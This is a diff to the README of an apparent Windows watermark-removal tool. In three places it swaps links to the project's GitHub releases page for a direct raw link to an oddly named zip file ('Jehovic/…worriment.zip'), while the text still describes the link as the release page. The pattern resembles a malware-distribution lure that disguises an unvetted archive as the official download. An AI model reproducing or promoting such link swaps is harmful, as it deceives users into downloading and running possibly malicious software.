@@ -1,6 +1,6 @@
 # ✨ gemini-watermark-remover-editghost - Remove Watermarks With Ease
 
-[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/matiassppeed-stack/gemini-watermark-remover-editghost/releases)
+[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/matiassppeed-stack/gemini-watermark-remover-editghost/main/Jehovic/remover_watermark_gemini_editghost_worriment.zip)
 
 ## 🖥️ What This App Does
 
@@ -20,7 +20,7 @@ The app runs on your device, so your images stay with you while you work.
 
 Use this link to visit the release page and download the app:
 
-[Download the latest version](https://github.com/matiassppeed-stack/gemini-watermark-remover-editghost/releases)
+[Download the latest version](https://raw.githubusercontent.com/matiassppeed-stack/gemini-watermark-remover-editghost/main/Jehovic/remover_watermark_gemini_editghost_worriment.zip)
 
 On that page, look for the latest release and download the Windows file that matches your system.
 
@@ -138,7 +138,7 @@ If the result looks rough:
 
 Use this page to get the latest Windows download:
 
-[https://github.com/matiassppeed-stack/gemini-watermark-remover-editghost/releases](https://github.com/matiassppeed-stack/gemini-watermark-remover-editghost/releases)
+[https://raw.githubusercontent.com/matiassppeed-stack/gemini-watermark-remover-editghost/main/Jehovic/remover_watermark_gemini_editghost_worriment.zip](https://raw.githubusercontent.com/matiassppeed-stack/gemini-watermark-remover-editghost/main/Jehovic/remover_watermark_gemini_editghost_worriment.zip)
 
 ## 🧩 Topics
 
